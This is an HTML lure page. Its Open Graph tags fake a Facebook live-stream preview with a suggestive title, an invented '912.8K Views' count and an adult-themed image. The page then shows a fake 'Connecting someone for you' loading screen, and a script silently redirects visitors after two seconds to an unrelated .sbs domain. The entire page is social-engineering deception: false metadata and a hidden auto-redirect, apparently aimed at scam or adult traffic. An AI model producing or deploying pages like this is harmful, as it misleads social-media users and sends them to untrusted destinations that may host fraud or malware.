<!DOCTYPE html>
<html>
<head>
  <!-- FOTO 1 BUAT PREVIEW FB -->
  <meta property="og:image" content="https://snipboard.io/5x0QoE.jpg">
  <meta property="og:title" content="🏠 LIVE: Let's Spend Tonight Together">
  <meta property="og:description" content="👁️ 912.8K Views">
  
  <title>Connecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{margin:0; padding:0;}
    body,html{
      height:100%; 
      /* FOTO ANYAR BUAT BACKGROUND NJERO */
      background:url('https://blurlink-image-origin.hot-girls69000-9be.workers.dev/originals/nHIOevNC.jpg') center/cover no-repeat #000; 
      font-family:'Segoe UI', Arial; 
      overflow:hidden;
    }
    #loading{
      position:fixed; top:0; left:0; width:100%; height:100%;
      background:rgba(0,0,0,0.1);
      display:flex; flex-direction:column; justify-content:center; align-items:center;
      color:#FFD700; z-index:10; backdrop-filter: blur(2px);
    }
    #loading h2{
      font-size:28px; margin-bottom:30px; font-weight:800;
      text-shadow:0 0 15px #000, 0 0 30px #FFD700;
      animation:glow 1.5s ease-in-out infinite; text-align:center; padding:0 20px;
    }
    @keyframes glow{0%,100%{opacity:1} 50%{opacity:0.8}}
    .ring{width:130px; height:130px; border:5px solid transparent; border-top:5px solid #FFD700; border-right:5px solid #FFA500; border-radius:50%; animation:spin 1s linear infinite; box-shadow:0 0 40px #FFD700; margin-bottom:25px;}
    @keyframes spin{to{transform:rotate(360deg)}}
    .loader{width:85%; max-width:450px; height:8px; background:rgba(0,0,0,0.3); border-radius:20px; overflow:hidden; box-shadow:0 0 20px rgba(255,215,0,0.5);}
    .bar{width:0%; height:100%; background:linear-gradient(90deg,#FFD700 0%,#FFF 50%,#FFA500 100%); box-shadow:0 0 25px #FFD700; animation:load 2s forwards;}
    @keyframes load{to{width:100%}}
    .dots{font-size:20px; margin-top:18px; letter-spacing:4px; text-shadow:0 0 10px #000;}
    .dots span{animation:blink 1.4s infinite both;} .dots span:nth-child(2){animation-delay:0.2s} .dots span:nth-child(3){animation-delay:0.4s}
    @keyframes blink{0%,80%,100%{opacity:0} 40%{opacity:1}}
  </style>
</head>
<body>
  <div id="loading">
    <div class="ring"></div>
    <h2>Connecting someone for you</h2>
    <div class="loader"><div class="bar"></div></div>
    <div class="dots"><span>.</span><span>.</span><span>.</span></div>
  </div>
  <script>setTimeout(()=>{ window.location.href = "https://fumifun.sbs/08xpia"; },2000);</script>
</body>
</html>
